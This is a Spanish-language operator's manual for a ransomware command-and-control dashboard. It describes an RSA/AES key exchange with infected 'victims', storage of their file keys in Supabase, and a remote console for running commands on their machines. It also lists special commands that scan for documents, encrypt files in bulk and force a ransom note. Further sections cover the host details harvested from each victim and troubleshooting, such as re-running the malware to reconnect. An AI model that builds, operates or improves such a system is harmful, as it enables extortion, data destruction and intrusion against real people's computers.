# 📖 Manual de Operaciones: C2 Dashboard & Recovery

Este manual describe el uso diario del sistema C2 y los procedimientos de operación y recuperación de claves.

---

## 🔐 Sistema de Cifrado Híbrido RSA + AES

El sistema implementa un esquema de **cifrado híbrido** para máxima seguridad:

### Flujo de Intercambio de Claves (Handshake)

```
┌─────────────────┐                    ┌─────────────────┐
│     CLIENTE     │                    │     SERVIDOR    │
└────────┬────────┘                    └────────┬────────┘
         │                                      │
         │  1. Conectar (Socket.IO)             │
         │─────────────────────────────────────>│
         │                                      │
         │  2. rsa-handshake (Clave Pública)    │
         │<─────────────────────────────────────│
         │                                      │
         │  [Cliente genera clave AES local]    │
         │  [Cifra AES con RSA público]         │
         │                                      │
         │  3. clave-aes-cliente (AES cifrada)  │
         │─────────────────────────────────────>│
         │                                      │
         │  [Servidor descifra con RSA privado] │
         │  [Guarda AES en Supabase]            │
         │                                      │
         │  4. registrado (confirmación)        │
         │<─────────────────────────────────────│
         │                                      │
```

### Especificaciones Criptográficas

| Componente | Algoritmo | Tamaño | Padding |
|------------|-----------|--------|---------|
| Intercambio de claves | RSA-2048 | 2048 bits | OAEP-SHA256 |
| Cifrado de archivos | AES-256-CBC | 256 bits | PKCS#7 |
| Vector de inicialización | Aleatorio | 128 bits | - |

---

## 🆘 Procedimiento de Recuperación de Claves

**Escenario Crítico**: El servidor de Render se ha reiniciado y necesitas recuperar claves.

### Pasos de Recuperación (Supabase):
1. Accede a tu proyecto en [Supabase Dashboard](https://app.supabase.com).
2. Ve a **Table Editor** > Tabla **`keys`**.
3. Localiza la fila correspondiente al **UUID** o **Hostname** afectado.
4. Copia el valor de la columna **`aes_key`** (string hexadecimal de 64 caracteres).

### Uso de la Clave Recuperada:

**Opción 1 - Desde el Dashboard:**
1. Ve a la pestaña "Claves" en `/database.html`
2. Haz clic en el botón de copiar junto a la clave AES
3. Usa el comando de descifrado remoto desde la consola

**Opción 2 - Descifrado Manual con OpenSSL:**
```bash
# Extraer IV (primeros 32 caracteres hex del archivo .cript)
xxd -p -l 16 archivo.cript

# Descifrar
openssl enc -d -aes-256-cbc -in archivo.cript -out archivo_original \
  -K [CLAVE_AES_HEX_64_CHARS] -iv [IV_HEX_32_CHARS]
```

**Opción 3 - Script Node.js:**
```javascript
const crypto = require('crypto');
const fs = require('fs');

const key = Buffer.from('TU_CLAVE_AES_64_HEX', 'hex');
const encrypted = fs.readFileSync('archivo.cript');
const iv = encrypted.slice(0, 16);
const data = encrypted.slice(16);

const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
const decrypted = Buffer.concat([decipher.update(data), decipher.final()]);
fs.writeFileSync('archivo_original', decrypted);
```

---

## 🎛️ Operaciones del Dashboard

### 1. Panel de Control (index.html)

| Elemento | Descripción |
|----------|-------------|
| **Selector de Cliente** | Dropdown para elegir víctima activa |
| **Estado WS** | Indicador de conexión WebSocket (Online/Offline) |
| **Clave AES** | Muestra la clave del cliente seleccionado |
| **Botones Kill Chain** | Ejecutar pasos 1-4 del ataque en orden |
| **Log de Actividad** | Historial de eventos en tiempo real |

### 2. Base de Datos (database.html)

**Pestañas disponibles:**

| Pestaña | Columnas | Acciones |
|---------|----------|----------|
| **Víctimas** | UUID, Hostname, Usuario, IP, Plataforma, Arquitectura, Estado, Fecha | Copiar |
| **Claves** | UUID, Hostname, Clave AES-256, Fecha | Copiar, Editar, Eliminar |
| **Archivos Cifrados** | UUID, Hostname, Archivo Cifrado, Original, Directorio, IV, Fecha | Copiar |
| **Claves RSA** | Clave Pública PEM, Clave Privada PEM | Copiar |

**Funcionalidades de la tabla:**
- **Filtro de búsqueda**: Escribe para filtrar por cualquier columna
- **Ordenar columnas**: Clic en cabeceras para ordenar asc/desc
- **Editar clave**: Botón lápiz permite modificar claves AES
- **Eliminar clave**: Botón papelera elimina de Supabase (con confirmación)
- **Auto-refresh**: Datos se actualizan cada 30 segundos

### 3. Consola Remota (consola.html)

Terminal interactiva para ejecutar comandos en la máquina víctima:

```bash
# Comandos nativos del sistema
dir                    # Listar archivos
whoami                 # Usuario actual
systeminfo             # Info del sistema
cd [ruta]              # Cambiar directorio
ipconfig               # Configuración de red

# Comandos especiales C2
c2:scan                # Escanear archivos objetivo
c2:encrypt [n]         # Cifrar n archivos (default: 100)
c2:encrypt-all [n]     # Cifrar TODOS los tipos
c2:decrypt             # Descifrar archivos .cript
c2:ransom              # Mostrar nota de rescate
c2:help                # Ver todos los comandos
```

---

## ⚡ Comandos Especiales ("Magic Words")

| Comando | Acción | Ejemplo |
|---------|--------|---------|
| `c2:scan` | Escanea recursivamente buscando .pdf, .docx, .xlsx, .jpg, .mp3, .mp4 | `c2:scan` |
| `c2:encrypt [n]` | Cifra `n` archivos (defecto: 100) | `c2:encrypt 500` |
| `c2:encrypt-all [n]` | Cifra TODOS los archivos (sin filtro de extensión) | `c2:encrypt-all 50` |
| `c2:encrypt-ext ext1,ext2` | Cifra solo extensiones específicas | `c2:encrypt-ext pdf,docx` |
| `c2:decrypt` | Descifra todos los archivos .cript en el directorio | `c2:decrypt` |
| `c2:ransom` | Fuerza la apertura de la nota de rescate (GUI) | `c2:ransom` |
| `c2:kill` | **⚠️ Destructivo**: Detiene persistencia y elimina malware | `c2:kill` |

---

## 🔐 Información del Sistema Capturada

Cuando un cliente se conecta, se registra en Supabase:

| Campo | Descripción | Ejemplo |
|-------|-------------|---------|
| `uuid` | Identificador único del cliente | `560c2e8d17f5...` |
| `hostname` | Nombre del equipo | `DESKTOP-ABC123` |
| `username` | Usuario actual | `JohnDoe` |
| `ip` | Dirección IP | `192.168.1.50` |
| `platform` | Sistema operativo | `win32`, `linux`, `darwin` |
| `arch` | Arquitectura | `x64`, `arm64` |
| `os_version` | Versión del SO | `Windows 10 Pro` |
| `cpu_model` | Modelo del procesador | `Intel Core i7-10700` |
| `total_memory` | Memoria RAM | `16 GB` |
| `status` | Estado de conexión | `connected`, `disconnected` |

---

## 🐛 Solución de Problemas

### Dashboard "Dormido"
**Síntoma**: WS: Offline al entrar
**Solución**:
1. Espera 30-60 segundos (Render suspende servicios gratuitos por inactividad)
2. Recarga la página (F5)
3. Verifica que el servidor esté corriendo en Render Dashboard

### Cliente conectado pero no responde
**Síntomas**: Cliente aparece en lista pero comandos no funcionan
**Solución**:
1. Verifica firewall/proxy que pueda bloquear WebSockets
2. Envía comando simple: `ping 127.0.0.1`
3. Si no responde, espera reconexión automática (heartbeat cada 5-10 min)

### Base de Datos vacía
**Síntomas**: Pestañas muestran "No hay datos"
**Solución**:
1. Verifica variables `SUPABASE_URL` y `SUPABASE_KEY` en Render
2. Revisa logs del servidor en Render para errores `[DB Error]`
3. Confirma que las tablas existen en Supabase SQL Editor

### Clave AES muestra "N/A"
**Síntomas**: Cliente conectado pero sin clave
**Causa**: Error en handshake RSA
**Solución**:
1. Revisa logs del servidor para errores de descifrado RSA
2. Verifica que las claves PEM existen en `/keys/`
3. Reconecta el cliente ejecutando el malware nuevamente

### Error al editar/eliminar claves
**Síntomas**: Botones de acción no funcionan
**Solución**:
1. Verifica conexión a internet
2. Revisa consola del navegador (F12) para errores
3. Confirma que los endpoints `/api/db/keys/update` y `/api/db/keys/delete` existen

---

## 📊 APIs Disponibles

| Endpoint | Método | Descripción |
|----------|--------|-------------|
| `/api/status` | GET | Estado del servidor |
| `/api/clientes` | GET | Lista de clientes conectados |
| `/api/db/victims` | GET | Todas las víctimas de Supabase |
| `/api/db/keys` | GET | Todas las claves de Supabase |
| `/api/db/encrypted` | GET | Archivos cifrados de Supabase |
| `/api/db/stats` | GET | Estadísticas (conteos) |
| `/api/rsa-keys` | GET | Claves RSA del servidor |
| `/api/db/keys/update` | POST | Actualizar clave AES |
| `/api/db/keys/delete` | POST | Eliminar clave |

---

**Última actualización**: 2026-01-13  
**Versión**: 2.0.0